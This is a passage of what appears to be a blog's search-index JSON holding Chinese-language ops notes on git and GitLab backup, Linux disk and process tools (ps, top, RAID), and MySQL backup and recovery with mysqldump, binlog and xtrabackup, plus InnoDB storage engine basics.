查看提交历史 $\u003e git log # 查看提交历史(精简) $\u003e git log --oneline # 撤回修改文件(未add时) $\u003e git checkout -- \u003cfile\u003e # 撤回修改文件(未commit时) $\u003e git reset HEAD \u003cfile\u003e # git checkout -- \u003cfile\u003e # 撤回修改文件(未push时) $\u003e git reset --hard \u003ccommitid\u003e # 查看历史操作记录 # 此命令大体执行在git reset --hard \u003ccommitid\u003e 之后，因为执行了git reset --hard \u003ccommitid\u003e后，git log将不再看到commitid之后的所有提交记录 $\u003e git reflog ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:5:1","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"分支 分支创建后，直接增删，各个分支不受影响 # 创建分支 $\u003e git branch test01 # 删除 git branch -d test01 # 查看分支 $\u003e git branch * master test01 # 切换分支 $\u003e git checkout test01 # git status # git log --oneline --decorate # 合并分支(比如：合并test01到master中，则当前需要切换到master中执行) # 当两个分支中，同时修改了一个文件，则会出现合并冲突，此时需要手动处理冲突文件 $\u003e git merge test01 ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:5:2","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"标签 标签可以作为一个commitid的惟一标记，相当于给commitid取的别名吧 # 给当前commit创建标签 $\u003e git tag v1.0 # git tag -a v1.0 # -a: 打开注释编辑页面 可使用-m \"message\"替代 # 针对特定commit打标签 $\u003e git tag v1.0 \u003ccommitid\u003e # 查看所有标签 $\u003e git tag # 查看当前标签的详细信息 $\u003e git show v1.0 # 删除标签 $\u003e git tag -d v1.0 # 重置到某个标签(提交点) $\u003e git reset --hard v1.0 # or git reset --hard \u003ccommit\u003e ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:5:3","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"远程推送(gitlab) $\u003e git remote add origin http://xxxxxxx/xxx.git $\u003e git push -u origin master ## gitlab 备份(/etc/gitlab.rb) # 备份路径 gitlab_rails['backup_path'] = '/data/backup' # 备份保留时间(秒) gitlab_rails['backup_keep_time'] = 604800 # 执行备份 $\u003e /usr/bin/gitlab-rake gitlab:backup:create # 数据恢复 # 停止数据写入服务 $\u003e gitlab-ctl stop unicorn $\u003e gitlab-ctl stop sidekiq $\u003e gitlab-rake gitlab:backup:restore BACKUP=\u003c备份文件的数字部分\u003e # 回车一路yes $\u003e gitlab-ctl restart ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:5:4","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux"],"content":"磁盘管理","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"磁盘管理 磁盘的最小存储单位是扇区，大小为0.5kb(512Bytes)，多个连续的扇区称之为块 操作系统文件存取的最小单位是块(block)，为8个连续扇区,大小是8 x 0.5 = 4kb,即使文件小于4k,也会占用4k ","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/:1:0","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"硬件设备 IDE硬盘: /dev/hd[a-d] SCSI/SATA硬盘: /dev/sd[a-d] 软盘: /dev/fd[0-1] 打印机: /dev/lp[0-2] 鼠标: /dev/psaux /dev/mouse ","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/:2:0","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"软硬链接 软连接: 类似windowns的快捷方式 硬链接: inode一致 ","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/:3:0","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"mount 命令 mount -o 参数详情 `async` 以异步的方式处理文件系统IO，加速写入，数据不会同步写入到磁盘，而是写入到一个缓冲区，提供系统性能，但损失安全性。 `sync` 所有的IO操着同步处理，数据同步写入到磁盘，性能较弱，但安全性提高 `atime/noatime` 文件被访问的时候，是否修改其时间戳，大量文件可以提升IO速度 `auto/noauto` 时候自动挂载 `defaults` 默认包含`rw`,`suid`,`dev`,`exec`,`auto`,`nouser`,`async等等` `exec/noexec` 是否允许挂载点内的可执行文件执行命令，只是禁止了从当前目录运行,并未禁止通过指定`bash`解释器来运行 `ro` 只读 `rw` 读写 ","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/:4:0","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"buffer cache buffer: 用于写入数据的缓冲 cache: 用于读取数据时的缓存 #　raid https://support.hp.com/cn-zh/document/c01193785 raid 0 : 100%利用存储空间。最少需要两块盘(据说一块也可以，不过个人觉得一块应该没啥用)， 没用冗余数据，不做备份，任何一块磁盘损坏都无法运行。理论读写是单块磁盘的n倍。存储性能最好，但安全性不高。 raid 1: 50%的利用空间，磁盘最小需要2n块,总空间以最小盘为准，镜像同步数据，理论读取速度不受影响，甚至更快一点，写入速度受影响，更换盘后需要长时间的镜像同步，但外部读取读写不受影响。 raid 3: 至少需要3块盘，最后一块盘用于存储奇偶校验数据(专用的奇偶校验)，空间利用率n - 1, 可用性、成本和性能折中，但由于需要奇偶校验，因此速度较慢。 raid 5: 和raid 3类似,也是至少需要3块盘，每个奇偶校验数据是存储于每一个相同的数据块(分布式存储奇偶校验数据) raid 10: raid 0 + raid 1,又称为raid 01 ","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/:5:0","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"系统管理","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"1. 进程与线程 进程: 一个程序的执行实例，也就是正在执行的程序 线程: 在一个程序里的一个执行路线就叫做线程 ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:1:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"2. ps 命令 -f : 显示UID、PID、PPID、C(使用cpu资源百分比)、STIME(进程运行的开始时间)、TTY、TIME(进程使用的cpu总时长)、CMD栏位。 ps aux|head -n 2 %CPU: cpu使用率 %MEM： 内存使用率 VSZ: 表示进程分配的虚拟内存(kb) RSS: 表示进程分配了多少内存（RAM中的物理内存），RSS不包含已经被换出的内存。RSS包含了它所链接的动态库并且被加载到物理内存中的内存。RSS还包含栈内存和堆内存。 (kb) STAT: 表示当前进程状态 S: 进程休眠中，可被唤醒; s: 当前进程含有子进程 ; R: 当前进程运行中; D: 不可中断的进程； T：进程暂停状态; Z:僵尸进程; \u003c 高优先级进程 ; N:低优先级进程 START: 进程开始时间 TIME： 进程执行时间 ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:2:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"3. top 命令 z: 打开或关闭颜色 k: 终止一个进程 i: 忽略闲置和僵死进程 r: 重新安排一个进程的优先级别 s: 改变两次刷新之间的延迟时间（单位为s） t: 切换显示进程和CPU状态信息 c: 切换显示命令名称和完整命令行 M: 根据驻留内存大小进行排序 P: 根据CPU使用百分比大小进行排序 x: 高亮某一列 ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:3:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"4. 进程检查 ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:4:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"4.1. pgrep 显示相关进程ID ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:5:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"4.2. kill 特殊信号 0 表示不发送任何信号给PID,但会对这个id进行检查，如果执行结果为0,表示次进程存在，如果结果为1,则表示进程不存在 ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:6:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"4.3. 特殊进程 孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。 僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。 参数详解 https://segmentfault.com/a/1190000008322093 http://blog.itpub.net/29270124/viewspace-2639162/ ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:7:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"5. top列说明 序号 列名 含义 a PID 进程id b PPID 父进程id c RUSER Real user name d UID 进程所有者的用户id e USER 进程所有者的用户名 f GROUP 进程所有者的组名 g TTY 启动进程的终端名。不是从终端启动的进程则显示为 ? h PR 优先级 i NI nice值。负值表示高优先级，正值表示低优先级 j P 最后使用的CPU，仅在多CPU环境下有意义 k %CPU 上次更新到现在的CPU时间占用百分比 l TIME 进程使用的CPU时间总计，单位秒 m TIME + 进程使用的CPU时间总计，单位1/100秒 n %MEM 进程使用的物理内存百分比 o VIRT 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES p SWAP 进程使用的虚拟内存中，被换出的大小，单位kb。 q RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA r CODE 可执行代码占用的物理内存大小，单位kb s DATA 可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb t SHR 共享内存大小，单位kb u nFLT 页面错误次数 v nDRT 最后一次写入到现在，被修改过的页面数。 w S 进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程) x COMMAND 命令名/命令行 y WCHAN 若该进程在睡眠，则显示睡眠中的系统函数名 z Flags 任务标志，参考 sched.h ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:8:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"top 展示列表说明 - 当前时间 总共运行时间 当前系统登陆用户 系统平均负载(正常水平不超过: 核心数x每个核心的线程x0.8) 1分钟 5分钟 15分钟 top 14:33:32 up 1:38 1 user load average 1.84 1.81 1.48 - 当前运行的进程 总共进程 正在运行的进程 休眠进程 停止进程 僵死进程 Tasks - 390 total 1 running 388 sleeping 0 stopped 1 zombie - cpu使用占用百分比 用户态 内核态 用户进程空间内改变过优先级的进程 空闲进程 等待输入输出 硬中断 软中断 虚拟机 %Cpu(s) - 5.0 us 1.5 sy 0.0 ni 93.0 id 0.0 wa 0.4 hi 0.1 si 0.0 st - 物理内存总大小 空间的内存总量 使用中的内存总量 缓存的内存总量 MiB Mem 23324.9 total 13501.5 free 4962.2 used 4861.1 buff/cache MiB Swap 交换区总量 空闲交换区总量 使用的交换区总量 可用内存总量 - 4096.0 total 4096.0 free 0.0 used 17387.7 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND - - 进程优先级 nice值，数字越大优先级越低，反之越高 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES 任务使用的非交换物理内存 任务使用的共享内存量。它只是反映了可能与其他进程共享的内存 任务的状态，可以是(D:不间断睡眠;R:运行;S:睡眠;T:暂停;Z:僵尸) 总CPU时间的百分比 任务当前使用的可用物理内存共享 任务自启动以来使用的总CPU时间 - ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:9:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"备份与恢复","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"mysql 备份与恢复 数据更新过程，例如 update 语句 写redo log，进入 prepare阶段(xtrabackup备份最低应处于该阶段 ) 写binlog落盘 redo log完成 commit ","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:1:0","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"备份类型 冷备份: 关闭数据，停止业务 温备份: 加锁备份 热备份: 在线备份，不影响业务 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:2:0","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"备份方式 逻辑备份: 基于sql语句的备份 mysqldump: 建库、建表、数据插入语句 基于二进制日志: 数据库的所有变化类的操作 基于复制的备份: 将二进制日志实时传送到另一台机器并且恢复 物理备份: xtrabackup进行物理备份 拷贝数据文件(冷备) ","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:3:0","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"备份工具 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:4:0","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"mysqldump mysql原生自带的逻辑备份工具 优点是备份结果是sql语句，都是文本格式，便于查看即压缩, 缺点是效率较慢 mysqldump -A -R --triggers --master-data=2 --single-transaction | gzip \u003e /data/backup_all.sql.gz 参数: -A: 全库备份(会备份mysql库) mysqldump -uroot -pxxx -A \u003e backup.sql -B： 增加建库(create)即\"use 库“的语句，可以直接连接多个库名，同时备份多个库-B 库1 库2 -R: 备份存储过程和函数数据 --triggers: 备份触发器数据 -F: 在备份是自动刷新一个二进制日志,方便将来二进制日志截取时的起点 --master-data=2: 告诉你备份时刻的binlog日志位置,一般选择2,以注释形式记录二进制日志的位置 -x, --lock-all-tables: 锁定所有表(锁表只会影响增删改,不会影响查询),保证整个数据库（所有schema）的数据具有一致性快照,一般不建议使用 -l, --lock-tables: 保证各个schema具有数据一致性快照 --single-transaction: 对innodb引擎进行热备 备份恢复: -- 方法一 --- mysql -uroot \u003c /data/backup_all.sql -- 方法二(建议使用) mysql\u003e set sql_log_bin=0 mysql\u003e source /data/backup_all.sql ... mysql\u003e mysqldump备份恢复案例: -- 每天晚上有全备份,第二天早上误删除一个表 -- 恢复思路 --- 1. 断开业务,防止二次伤害(挂出维护页面) --- 2. 搭建备用库 --- 3. 截取昨天晚上全备时间到早上删除之前的日志 --- 4. 恢复到备用库,验证数据完整性 --- 5. 两种方案恢复前端应用 ---- 5.1. 备用库导出误删表到生产库 ---- 5.2. 直接切换到备用库 -- 具体操作 --- 1. 获取全备时刻的binlog号(:22) --- -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000039', MASTER_LOG_POS=183021; --- 2. 截取binlog从全备到删除时刻的binlog号 此处不能和前面交错截取，不然可能会出问题 mysql\u003e show binlog events in 'mysql-bin.000002'; -- end: 183014 $\u003e mysqlbinlog --no-defaults --start-position=183021 --stop-position=183014 /data/mysql56/3307/data/mysql-bin/mysql-bin.000039 \u003e\u003e /data/binlog.sql --- 临时关闭二进制日志信息 mysql\u003e set sql_log_bin=0 mysql\u003e source /data/backup_all.sql mysql\u003e source /data/binlog.sql mysql\u003e set sql_log_bin=1 --- binlog自动清理 mysql\u003e show variables like '%expire%'; mysql\u003e set global expire_logs_days=8; -- 一般设置为全备+1天 -- 永久生效 -- /etc/my.cnf -- expire_logs_days=8 -- 手动清理二进制文件 mysql\u003e purge binary logs before now() - interval 3 day; -- 3 天前 mysql\u003e purage binary logs to 'mysql-bin.000010'; -- 删除到 -- 不要手动 rm mysql-bin.00000x 文件，否则会出现问题，解决方案 -- 1. 关闭 my.cnf binlog相关参数，删除mysql-bin.index文件,启动数据库 -- 2. 关闭数据库，开启binlog相关参数，启动数据库 -- 滚动一个新的日志(重启会自动滚动一个日志) mysql\u003e flush logs; ","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:4:1","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"mysqlbinlog 实现binlog备份的原生命令 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:4:2","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"xtrabackup precona公司开发的性能很高的物理备份工具(热备) 备份方式: 拷贝数据文件 拷贝数据页 备份原理(innoDB): 对于innoDB表,可以实现热备 在数据还有修改操作的时候,直接将数据文件中的数据页备份(应该是相当于磁盘块),此时,备份走的数据对于当前mysql来讲是不一致的 将备份过程中的redo和undo一并备走 为了恢复的时候,只要保证备份出来的数据页LSN能和redo LSN匹配,将来恢复的就是一致的数据. redo应用和undo的应用 对于myisam表实现自动说表拷贝文件 xtrabackup 安装使用: XtraBackup 2.4/8.0 版本区别 通过查到可知 XtraBackup 2.4 与 8.0 版本备份记录信息有如下不同点： 2.4 备份生成的 xtrabackup_binlog_info 文件记录的 GTID 信息是准确的，但是备份恢复后 show master status 显示的 GTID 是不准确的； 8.0 备份的实例中只有 InnoDB 表时，xtrabackup_binlog_info 文件记录的 GTID 信息不一定是准确的，但是备份恢复后 show master status 显示的 GTID 是准确的； 8.0 备份的实例中有非 InnoDB 表时，xtrabackup_binlog_info 文件记录的 GTID 信息是准确的，备份恢复后 show master status 显示的 GTID 也是准确的 # $\u003e wget https://downloads.percona.com/downloads/Percona-XtraBackup-2.4/Percona-XtraBackup-2.4.21/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.21-1.el7.x86_64.rpm $\u003e yum install -y percona-xtrabackup-24-2.4.21-1.el7.x86_64.rpm # 备份测试(需指定配置文件my.cnf、用户名、密码) $\u003e innobackupex /data/backup/ /data/backup/ └── 2021-01-19_16-01-57 ├── mysql ├── performance_schema ├── test ├── testdb01 ├── testdb02 └── world # 全备份，不使用时间戳为备份目录 $\u003e innobackupex --no-timestamp /data/backup/full 2 [error opening dir] /data/backup/full ├── mysql ├── performance_schema ├── test ├── testdb01 ├── testdb02 └── world # 全备恢复示例 # 1. 恢复数据前的准备(合并xtabackup_log_file和备份的物理文件) $\u003e innobackupex --apply-log --use-memory=32M /data/backup/full/ # 2. 模拟故障 (停止数据库，删除数据) # 3. 恢复数据 ## 3.1 直接复制全备数据进去即可(恢复时，需要确认数据路径为空，且数据库必须停止),单库直接复制测试可行 $\u003e cp -a /data/backup/full/* /data/mysql56/3307/data/ ## 3.2 命令复制 $\u003e innobackupex --copy-back /data/backup/full/ # 增量备份 ## 增量备份是基于全备开始 ## 1. 周一全备 $\u003e innobackupex --no-timestamp /data/backup/full ## 数据写入 ## 2. 周二增量备份 基于那个全备进行增量备份 $\u003e innobackupex --incremental --no-timestamp --incremental-basedir=/data/backup/full /data/backup/inc1 ## 数据写入 ## 3. 周三增量备份 基于那个备份(全备)进行增量备份 $\u003e innobackupex --incremental --no-timestamp --incremental-basedir=/data/backup/inc1 /data/backup/inc2 ## 数据损坏,准备恢复 ## 停止数据库 ## 数据恢复 --redo-only: 只将以提交的数据进行合并(除了最后一次不加外,每一次都需要添加) $\u003e innobackupex --apply-log --redo-only /data/backup/full/ $\u003e innobackupex --apply-log --redo-only --incremental-dir=/data/backup/inc1 /data/backup/full $\u003e innobackupex --apply-log --incremental-dir=/data/backup/inc2 /data/backup/full $\u003e innobackupex --apply-log /data/backup/full/ $\u003e innobackupex --copy-back /data/backup/full/ # 单表恢复案例(单库恢复目前查询到的方案是,需要目前库和库中的表结构,然后通过concat批量拼接断开和连接语句然后,按照单表恢复案例批量操作) ## 误删除数据库中的一个表,需要恢复,不需要恢复整个数据库(或者mysql) ## 具体操作 ### 1. 删除数据库中的某个表(模拟演示)show bin ### 2. 创建与删除的表结构一模一样的表 ### 3. 删除创建表的表空间数据库文件(*.ibd),此处只能在数据库中的删除 ### select concat('alter table ',table_name,' discard tablespace ;') from information_schema.tables where table_schema='\u003cdatabase_name\u003e' into outfile '/tmp/\u003cdatabase_name\u003e.sql' ; #### into outfile '/tmp/\u003cdatabase_name\u003e.sql' #### 需设置安全路径 /etc/my.cnf:[mysqld] secure-file-priv=/tmp ,重启 mysql\u003e alter table \u003ctable_name\u003e discard tablespace; ### 4. 复制全备中该删除表的*.ibd文件到mysql对应目录下,注意修正权限 $\u003e cp /data/backup/full/\u003cdatabase_name\u003e/\u003ctable_name\u003e.ibd /path/data/\u003cdatabase_name\u003e/\u003ctable_name\u003e.ibd ### 5. 重新连接表空间数据文件 mysql\u003e alter table \u003ctable_name\u003e import tablespace; ","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:4:3","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"Mysql 存储引擎","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1. mysql 存储引擎 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:1:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.1. 引擎分类 可以表述为mysql的'文件系统', 存储引擎可以针对单表来进行设置。 mysql提供的有(最常用的InnoDB、MyISAM) : InnoDB MyISAM MEMORY ARCHIVE FEDERATED EXAMPLE BLACKHOLE MERGE NDBCLUSTER CSV 第三方: TokuDB ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:2:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.2. InnoDB --- 查看默认的数据库引擎 mysql\u003e select @@default_storage_engine; --- 查看当前数据库支持的数据库引擎 mysql\u003e show engines; --- 查看某个表所使用的存储引擎 mysql\u003e show create table city --- show table status like 'city'\\G --- select t.TABLE_NAME,t.TABLE_SCHEMA, t.ENGINE from `TABLES` t where t.TABLE_SCHEMA = 'world' ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:3:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.3. 引擎设置 编译时直接指定默认的存储引擎 在启动的配置文件中指定 [mysqld] default-storage-engine=InnoDB 使用SET命令为当前客户机会话设置 mysql\u003e SET @@storage-engine=InnoDB 在建表语句(CREATE TABLE)中指定(开发规范) mysql\u003e CREATE TABLE T(I INT) ENGINE = InnoDB ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:4:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.4. 表空间 共享表空间： 主要存放系统元数据等 独立表空间： 主要存放用户数据 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:5:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.4.1. 表空间设置 查看: show variables like 'innodb_data_file_path' [mysqld] ; 第一个ibdata 必定是一个固定大小的，若在启动后修改，则需要设置与实际大小一致，不能多也不能少，第二个则不受限制(默认是下12M) innodb_data_file_path=ibdata1:512M;ibdata2:512M:autoextend ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:5:1","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.5. 表空间数据文件 从5.6开始，mysql会为每个新表配置独立的表空间，设置项为innodb_file_per_table: ON,此项修改仅会更改新建表的属性。 *.frm: 元数据,包含表结构等 *.ibd: 表的数据文件 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:6:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.6. 事务ACID Atomic(原子性): 所有语句作为一个单元全部成功执行或全部取消 Consistent(一致性): 如果数据库在事务开始时处于一致状态，则在执行改事务期间将保留一致状态。 Isolated(隔离性): 事务之间互不影响。 Durable(持久性): 事务成功个完成后，所做的所有更改都会准确的记录在数据库中，所做的更改不会丢失。 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:7:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.6.1. 事务(SQL)控制语句 标准的事务语句指的是DML语句 BEGIN(START TRANSACTION): 开始一个新的事务 COMMIT： 永久提交当前事务的更改 ROLLBACK： 回滚当前事务更改 SAVEPOINT: 分配事务过程中的一个位置，以提供将来引用 ROLLBACK TO SAVEPOINT: 取消在SAVEPOINT之后执行的更改 RELEASE SAVEPOINT: 删除SAVEPOINT标识符 SET 